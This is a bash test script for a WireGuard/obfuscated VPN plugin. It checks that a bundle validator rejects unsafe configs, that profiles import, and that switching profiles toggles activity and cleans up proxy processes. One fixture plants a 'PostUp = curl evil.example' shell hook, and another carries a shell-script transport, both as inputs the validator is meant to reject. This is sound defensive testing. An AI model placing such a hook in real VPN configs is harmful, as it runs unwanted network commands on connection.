#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
export PATH="$ROOT/tests/bin:$PATH"
WORKDIR="$(mktemp -d)"
trap 'rm -rf "$WORKDIR"' EXIT
export CONTINUUM_VPN_CONFIG_DIR="$WORKDIR/config"
export CONTINUUM_VPN_RUNTIME_DIR="$WORKDIR/run"
export CONTINUUM_VPN_NM_STATE="$WORKDIR/nm"
mkdir -p "$CONTINUUM_VPN_CONFIG_DIR" "$CONTINUUM_VPN_RUNTIME_DIR" "$CONTINUUM_VPN_NM_STATE"

PRIV="$(wg genkey)"
PUB="$(printf '%s\n' "$PRIV" | wg pubkey)"
WG="[Interface]
PrivateKey = $PRIV
Address = 10.8.0.2/32
[Peer]
PublicKey = $PUB
Endpoint = 127.0.0.1:51821
AllowedIPs = 0.0.0.0/0
"

assert_fail() {
  local needle="$1"
  shift
  local err
  if err="$("$@" 2>&1)"; then
    echo "expected failure: $*" >&2
    exit 1
  fi
  printf '%s\n' "$err" | grep -q "$needle" || {
    echo "missing [$needle] in: $err" >&2
    exit 1
  }
}

python3 "$ROOT/validate_bundle.py" --help >/dev/null

HOOK="$WORKDIR/hook.conf"
printf '%s\n' "$WG" "PostUp = curl evil.example" >"$HOOK"
assert_fail "shell hooks" python3 "$ROOT/validate_bundle.py" --input "$HOOK" --dest "$WORKDIR/reject"

SHELLB="$WORKDIR/shell.json"
python3 - "$SHELLB" "$PRIV" "$PUB" <<'PY'
import json, sys
path, priv, pub = sys.argv[1:]
json.dump({
  "label": "bad",
  "source": "egress",
  "obfuscation": "udp2raw",
  "iface": "10.1.1.1",
  "wireGuardConfig": f"[Interface]\nPrivateKey = {priv}\nAddress = 10.8.0.2/32\n[Peer]\nPublicKey = {pub}\nEndpoint = 127.0.0.1:1\nAllowedIPs = 0.0.0.0/0\n",
  "transportBinary": "udp2raw",
  "transportFilename": "10.1.1.1-u2r.sh",
  "transportConfig": "#!/bin/sh\necho hi\n",
}, open(path, "w"))
PY
assert_fail "not started by this plugin" python3 "$ROOT/validate_bundle.py" --input "$SHELLB" --dest "$WORKDIR/reject"

BUNDLE="$WORKDIR/exit.json"
python3 - "$BUNDLE" "$PRIV" "$PUB" <<'PY'
import json, sys
path, priv, pub = sys.argv[1:]
json.dump({
  "label": "1.2.3.4",
  "countryCode": "de",
  "source": "egress",
  "obfuscation": "shadowsocks",
  "iface": "1.2.3.4",
  "wireGuardConfig": f"[Interface]\nPrivateKey = {priv}\nAddress = 10.8.0.2/32\n[Peer]\nPublicKey = {pub}\nEndpoint = 127.0.0.1:51821\nAllowedIPs = 0.0.0.0/0\n",
  "transportBinary": "sslocal",
  "transportFilename": "1.2.3.4-ss.json",
  "transportConfig": '{"local_port": 51821, "server": "203.0.113.5"}\n',
}, open(path, "w"))
PY

LABEL="$("$ROOT/backend.sh" import-file "$BUNDLE")"
[[ "$LABEL" == "1.2.3.4" ]]

PLAIN="$WORKDIR/cont-full.conf"
printf '%s\n' "[Interface]" "PrivateKey = $PRIV" "Address = 10.7.0.2/32" "[Peer]" "PublicKey = $PUB" "Endpoint = 198.51.100.8:51820" "AllowedIPs = 10.7.0.0/24" >"$PLAIN"
"$ROOT/backend.sh" import-file "$PLAIN" >/dev/null

LIST="$("$ROOT/backend.sh" list)"
python3 - "$LIST" <<'PY'
import json, sys
rows = {row["iface"]: row for row in json.loads(sys.argv[1])}
assert rows["1.2.3.4"]["active"] is False
assert rows["cont-full"]["obfuscation"] == "none"
assert rows["1.2.3.4"]["label"] == "1.2.3.4"
assert rows["1.2.3.4"]["countryCode"] == "DE"
assert rows["1.2.3.4"]["countryFlag"] == "🇩🇪"
assert rows["cont-full"]["countryCode"] == ""
PY

"$ROOT/backend.sh" up 1.2.3.4 >/dev/null
LIST="$("$ROOT/backend.sh" list)"
python3 - "$LIST" <<'PY'
import json, sys
rows = {row["iface"]: row for row in json.loads(sys.argv[1])}
assert rows["1.2.3.4"]["active"] is True
assert rows["cont-full"]["active"] is False
PY

"$ROOT/backend.sh" up cont-full >/dev/null
LIST="$("$ROOT/backend.sh" list)"
python3 - "$LIST" <<'PY'
import json, sys
rows = {row["iface"]: row for row in json.loads(sys.argv[1])}
assert rows["cont-full"]["active"] is True
assert rows["1.2.3.4"]["active"] is False, rows
PY

"$ROOT/backend.sh" down cont-full >/dev/null
# The shadowsocks stand-in must be gone after the first profile was switched off.
if compgen -G "$CONTINUUM_VPN_RUNTIME_DIR/*.pid" >/dev/null; then
  echo "proxy pid file left behind" >&2
  exit 1
fi

echo "ok"
